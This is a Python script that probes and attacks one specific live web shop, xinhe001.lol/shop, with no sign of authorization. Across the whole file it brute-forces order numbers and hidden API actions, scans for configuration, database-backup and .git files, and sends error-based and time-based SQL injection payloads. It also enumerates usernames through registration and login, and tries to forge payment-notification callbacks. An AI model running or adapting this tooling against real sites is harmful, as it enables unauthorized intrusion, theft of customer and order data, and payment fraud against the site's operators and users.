#!/usr/bin/env python3
"""Slow probe for xinhe001.lol/shop/ - respects rate limits."""
import re, json, time, subprocess, hashlib
from datetime import datetime

BASE = "https://xinhe001.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
COOKIE = "/tmp/xinhe_probe_cookies.txt"
DELAY = 5  # seconds between requests

findings = []
results = {"ts": datetime.utcnow().isoformat(), "findings": findings, "tests": {}}


def curl(url, method="GET", data=None, extra_hdrs=None, timeout=25):
    time.sleep(DELAY)
    cmd = [
        "curl", "-sS", "-m", str(timeout), "-A", UA,
        "-c", COOKIE, "-b", COOKIE,
        "-w", "\n__HTTP__%{http_code}__%{time_total}",
    ]
    if extra_hdrs:
        for h in extra_hdrs:
            cmd += ["-H", h]
    if method == "POST":
        cmd += ["-X", "POST"]
        if data:
            cmd += ["-d", data]
    cmd.append(url)
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8", "replace")
    if "__HTTP__" in out:
        body, meta = out.rsplit("__HTTP__", 1)
        m = re.match(r"(\d+)__([\d.]+)", meta.strip())
        code = int(m.group(1)) if m else 0
        elapsed = float(m.group(2)) if m else 0
        return body, code, elapsed
    return out, 0, 0


def add_finding(level, title, detail):
    findings.append({"level": level, "title": title, "detail": detail})
    print(f"[{level}] {title}: {detail[:200]}")


# --- bootstrap session ---
body, code, _ = curl(f"{BASE}/")
csrf_m = re.search(r'csrf_token\s*=\s*"([^"]+)"', body)
csrf = csrf_m.group(1) if csrf_m else ""
results["csrf_sample"] = csrf[:20]
print(f"home {code} len={len(body)} csrf={csrf[:16]}...")

# --- 1. getshop trade_no enumeration ---
print("\n=== getshop enumeration ===")
trade_samples = [
    "1", "2", "100", "1000", "99999",
    "20250709001", "20250709123456",
    "abc", "0", "-1", "1' OR '1'='1",
    "20260101000000000001",
]
getshop_responses = {}
for tn in trade_samples:
    body, code, _ = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    key = body.strip()[:120]
    getshop_responses[tn] = {"code": code, "body": body.strip()[:300]}
    print(f"  trade_no={tn:25} http={code} -> {body.strip()[:100]}")

# diff responses
unique_msgs = {}
for tn, r in getshop_responses.items():
    b = r["body"]
    unique_msgs.setdefault(b, []).append(tn)
if len(unique_msgs) > 1:
    add_finding("Med", "getshop.php 响应差异",
                f"不同 trade_no 返回不同响应: {json.dumps({k[:80]: v for k,v in unique_msgs.items()}, ensure_ascii=False)}")
else:
    print("  all getshop responses identical")

results["tests"]["getshop"] = getshop_responses

# --- 2. order query enumeration ---
print("\n=== query enumeration ===")
query_tests = ["1", "2", "100", "13800138000", "test@test.com", "admin", "' OR 1=1--"]
query_results = {}
for q in query_tests:
    body, code, _ = curl(f"{BASE}/?mod=query&data={q}")
    empty = "没有查询到数据" in body
    has_rows = '<tbody>' in body and 'empty' not in body.lower() and '没有查询到' not in body
    # extract table rows
    rows = re.findall(r'<tr[^>]*>.*?</tr>', body, re.S)
    data_rows = [r for r in rows if '订单ID' not in r and 'empty' not in r and len(r) > 50]
    query_results[q] = {
        "code": code, "empty": empty, "has_data": bool(data_rows),
        "row_count": len(data_rows), "snippet": body[body.find("<tbody>"):body.find("</tbody>")+8][:500] if "<tbody>" in body else ""
    }
    status = "HIT" if data_rows else "miss"
    print(f"  data={q:20} -> {status} rows={len(data_rows)}")

if any(r["has_data"] for r in query_results.values()):
    add_finding("High", "订单查询泄露",
                str({k: v for k, v in query_results.items() if v["has_data"]}))
results["tests"]["query"] = query_results

# --- 3. api.php act brute ---
print("\n=== api.php acts ===")
acts = [
    "goods", "goodslist", "shop", "shops", "tool", "tools", "query", "order", "orders",
    "kmlist", "km", "card", "faka", "stock", "user", "login", "reg", "register",
    "recharge", "balance", "pay", "notify", "callback", "check", "verify",
    "article", "class", "fenlei", "cart", "email", "sms", "token", "key",
    "getshop", "getorder", "orderlist", "buy", "submit", "info", "site",
    "config", "setting", "admin", "test", "debug", "status", "count",
]
api_hits = {}
for act in acts:
    body, code, _ = curl(f"{BASE}/api.php?act={act}", timeout=15)
    b = body.strip()
    if not b or "reset" in b.lower() or "Empty reply" in b or code == 0:
        continue
    if b != '{"code":-5,"msg":"No Act!"}' and "No Act" not in b:
        api_hits[act] = b[:300]
        print(f"  HIT act={act}: {b[:150]}")
        if '"code":0' in b or '"code":1' in b or "password" in b.lower() or "km" in b.lower():
            add_finding("High", f"api.php act={act} 有数据返回", b[:300])

if api_hits:
    add_finding("Med", "api.php 有效 act 参数", json.dumps(api_hits, ensure_ascii=False)[:500])
results["tests"]["api"] = api_hits

# --- 4. ajax.php act brute ---
print("\n=== ajax.php acts ===")
ajax_acts = [
    "pay", "payrmb", "getcount", "cancel", "captcha", "query", "getshop",
    "order", "checkorder", "cart", "addcart", "login", "reg", "userinfo",
    "recharge", "getgoods", "goods", "stock", "kmlist", "card",
    "getshuoshuo", "getrizhi", "getshareid", "share_invitegift_link",
]
ajax_hits = {}
for act in ajax_acts:
    body, code, _ = curl(f"{BASE}/ajax.php?act={act}", timeout=15)
    b = body.strip()
    if not b or "reset" in b.lower():
        continue
    ajax_hits[act] = {"http": code, "body": b[:200]}
    if b not in ('{"code":403}', '{"code":-5,"msg":"No Act!"}') and "403" not in b:
        print(f"  act={act}: {b[:120]}")

results["tests"]["ajax"] = ajax_hits

# --- 5. sensitive paths ---
print("\n=== path scan ===")
paths = [
    "admin/", "admin/login.php", "admin/index.php", "manage/", "manager/",
    "user/ajax.php", "user/api.php", "includes/config.php", "includes/common.php",
    "install/", "install/index.php", "install/install.lock",
    "config.php", ".env", "composer.json", "phpinfo.php", "test.php",
    "backup/", "backup.sql", "database.sql", "db.sql",
    "other/notify.php", "other/return.php", "other/epay_notify.php",
    "other/alipay_notify.php", "other/wxpay_notify.php", "other/usdt_notify.php",
    "cron.php", "task.php", "api/shop.php", "api/order.php",
    ".git/HEAD", ".git/config", "robots.txt", "sitemap.xml",
]
path_results = {}
for p in paths:
    body, code, _ = curl(f"{BASE}/{p}", timeout=15)
    interesting = code in (200, 301, 302, 403) and len(body) > 0
    path_results[p] = {"code": code, "len": len(body), "preview": body[:150].replace("\n", " ")}
    if code == 200 and p not in ("robots.txt",):
        low = body.lower()
        if any(x in low for x in ["password", "mysql", "db_", "secret", "install", "admin", "root:"]):
            add_finding("High", f"敏感路径 {p}", body[:300])
            print(f"  SENSITIVE {p} code={code}")
        elif "404" not in body[:200] and len(body) < 5000:
            print(f"  {p} -> {code} len={len(body)} | {body[:80].replace(chr(10),' ')}")

results["tests"]["paths"] = path_results

# --- 6. SQLi probes (error-based) ---
print("\n=== SQLi error probes ===")
sqli_payloads = [
    ("query", f"{BASE}/?mod=query&data=1'"),
    ("query2", f"{BASE}/?mod=query&data=1 AND SLEEP(3)--"),
    ("getshop", f"{BASE}/other/getshop.php?trade_no=1'"),
    ("api", f"{BASE}/api.php?act=order&id=1'"),
    ("buy", f"{BASE}/?mod=buy&cid=1&tid=1'"),
]
sqli_results = {}
for name, url in sqli_payloads:
    t0 = time.time()
    body, code, elapsed = curl(url, timeout=30)
    sqli_results[name] = {"code": code, "elapsed": elapsed, "body": body[:300]}
    errors = re.findall(r'(SQL|mysql|syntax|Warning|Fatal|PDO|mysqli)', body, re.I)
    if errors:
        add_finding("High", f"SQLi 错误泄露 [{name}]", body[:400])
        print(f"  SQL ERROR {name}: {errors}")
    elif elapsed > 4 and "SLEEP" in url:
        add_finding("High", f"时间盲注可能 [{name}]", f"elapsed={elapsed}s")
        print(f"  TIME {name}: {elapsed}s")
    else:
        print(f"  {name}: code={code} elapsed={elapsed:.1f}s len={len(body)}")

results["tests"]["sqli"] = sqli_results

# --- 7. install.lock content ---
print("\n=== install.lock ===")
body, code, _ = curl(f"{BASE}/install/install.lock")
if code == 200 and body.strip():
    add_finding("Med", "install.lock HTTP 可读", body[:200])
    print(f"  lock content: {body[:100]}")
results["tests"]["install_lock"] = body[:200]

# --- 8. Registration probe ---
print("\n=== reg page ===")
body, code, _ = curl(f"{BASE}/user/reg.php")
reg_csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', body)
has_captcha = "captcha" in body.lower() or "geetest" in body.lower()
print(f"  reg page {code} captcha={has_captcha}")
# check username enum via POST without captcha
if reg_csrf:
    post_data = (
        f"user=testprobe{int(time.time())}&pass=Test123456&qq=123456&email=probe@test.com"
        f"&captcha_type=1&csrf_token={reg_csrf.group(1)}"
    )
    body2, code2, _ = curl(f"{BASE}/user/ajax.php?act=reg", method="POST", data=post_data)
    print(f"  reg attempt: {body2[:200]}")
    if "已存在" in body2 or "exists" in body2.lower():
        add_finding("Med", "注册用户名枚举", body2[:200])
    results["tests"]["reg"] = body2[:300]

# --- 9. Login brute / enum ---
print("\n=== login probe ===")
body, code, _ = curl(f"{BASE}/user/login.php")
login_csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', body)
if login_csrf:
    for user in ["admin", "test", "xinghe001"]:
        post_data = f"user={user}&pass=wrongpass123&csrf_token={login_csrf.group(1)}"
        body2, code2, _ = curl(f"{BASE}/user/ajax.php?act=login", method="POST", data=post_data)
        print(f"  login {user}: {body2[:120]}")
        if "不存在" in body2 or "not exist" in body2.lower():
            add_finding("Med", "登录用户名枚举", f"{user}: {body2[:100]}")
    results["tests"]["login"] = "done"

# --- 10. Payment notify endpoints ---
print("\n=== payment notify ===")
for p in ["other/notify.php", "other/return.php", "other/epay_notify.php",
          "other/alipay_notify.php", "other/wxpay_notify.php"]:
    # GET
    body, code, _ = curl(f"{BASE}/{p}")
    # POST empty
    body2, code2, _ = curl(f"{BASE}/{p}", method="POST", data="trade_no=1&status=1")
    if "success" in body2.lower() or "ok" in body2.lower() or body2 != body:
        print(f"  {p} GET={body[:60]} POST={body2[:60]}")
        if "success" in body2.lower() or '"code":0' in body2:
            add_finding("High", f"支付回调可伪造? {p}", f"GET:{body[:100]} POST:{body2[:100]}")

# save
out = "/workspace/aaap-recon/xinhe_probe_results.json"
with open(out, "w") as f:
    json.dump(results, f, ensure_ascii=False, indent=2)
print(f"\n=== DONE: {len(findings)} findings, saved {out} ===")
